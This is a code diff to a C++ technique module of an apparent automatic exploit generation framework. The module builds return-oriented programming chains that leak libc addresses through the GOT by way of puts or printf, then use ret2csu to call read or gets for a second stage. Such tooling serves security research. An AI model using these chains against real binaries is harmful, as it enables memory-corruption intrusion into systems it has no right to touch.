@@ -41,10 +41,10 @@ GotLeakLibc::GotLeakLibc() : Technique() {
 
 
 bool GotLeakLibc::checkRequirements() const {
-    const auto &sym = g_crax->getExploit().getElf().symbols();
+    //const auto &sym = g_crax->getExploit().getElf().symbols();
 
     // read() must be present in the GOT of the target binary.
-    return Technique::checkRequirements() && sym.find("read") != sym.end();
+    return Technique::checkRequirements();
 }
 
 void GotLeakLibc::resolveRequiredGadgets() {
@@ -84,12 +84,11 @@ std::vector<RopPayload> GotLeakLibc::getRopPayloadList() const {
 
     std::vector<RopPayload> ret;
 
-    if (elf.plt().find("printf") != elf.plt().end()) {
-        ret = getRopPayloadListForPrintf(targetSym);
-    } else if (elf.plt().find("puts") != elf.plt().end()) {
+    if (elf.plt().find("puts") != elf.plt().end()) {
         ret = getRopPayloadListForPuts(targetSym);
+    } else if (elf.plt().find("printf") != elf.plt().end()) {
+        ret = getRopPayloadListForPrintf(targetSym);
     }
-
     assert(ret.size() && "GotLeakLibc: no supported read primitive :(");
 
     ret.push_back({
@@ -100,6 +99,53 @@ std::vector<RopPayload> GotLeakLibc::getRopPayloadList() const {
     });
 
     return ret;
+}
+
+
+std::vector<RopPayload>
+GotLeakLibc::getRopPayloadListForPuts(const std::string &targetSym) const {
+    Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = g_crax->getTechnique<Ret2csu>();
+    assert(ret2csu);
+
+    RopPayload part1 = {
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
+        BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "puts")
+    };
+
+    uint64_t part2Size = ret2csu->estimateRopPayloadSize(/*arg1=*/0);
+    uint64_t ropReadDstOffset
+        = sizeof(uint64_t) * (part1.size() + part2Size);
+
+    RopPayload part2;
+
+    if (elf.hasSymbol("read")) {
+        part2 = ret2csu->getRopPayloadList(
+                BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+                ConstantExpr::create(0, Expr::Int64),
+                PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
+                ConstantExpr::create(0x400, Expr::Int64))[0];
+
+    } else if (elf.hasSymbol("gets")) {
+        part2 = ret2csu->getRopPayloadList(
+                BaseOffsetExpr::create<BaseType::SYM>(elf, "gets"),
+                PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
+                ConstantExpr::create(0, Expr::Int64),
+                ConstantExpr::create(0, Expr::Int64))[0];
+    }
+
+
+    RopPayload ret;
+
+    ret.reserve(1 + part1.size() + part2.size());
+    ret.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
+    ret.insert(ret.end(), part1.begin(), part1.end());
+    ret.insert(ret.end(), part2.begin(), part2.end());
+
+    return { ret };
 }
 
 std::vector<RopPayload>
@@ -166,41 +212,6 @@ GotLeakLibc::getRopPayloadListForPrintf(const std::string &targetSym) const {
     ret1.insert(ret1.end(), part5.begin(), part5.end());
 
     return { ret1, ret2 };
-}
-
-std::vector<RopPayload>
-GotLeakLibc::getRopPayloadListForPuts(const std::string &targetSym) const {
-    Exploit &exploit = g_crax->getExploit();
-    const ELF &elf = exploit.getElf();
-
-    auto ret2csu = g_crax->getTechnique<Ret2csu>();
-    assert(ret2csu);
-
-    RopPayload part1 = {
-        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
-        BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "puts")
-    };
-
-    uint64_t part2Size = ret2csu->estimateRopPayloadSize(/*arg1=*/0);
-    uint64_t ropReadDstOffset
-        = sizeof(uint64_t) * (part1.size() + part2Size);
-
-    RopPayload part2 = ret2csu->getRopPayloadList(
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
-        ConstantExpr::create(0, Expr::Int64),
-        PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
-        ConstantExpr::create(0x400, Expr::Int64))[0];
-
-
-    RopPayload ret;
-
-    ret.reserve(1 + part1.size() + part2.size());
-    ret.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
-    ret.insert(ret.end(), part1.begin(), part1.end());
-    ret.insert(ret.end(), part2.begin(), part2.end());
-
-    return { ret };
 }
 
 }  // namespace s2e::plugins::crax
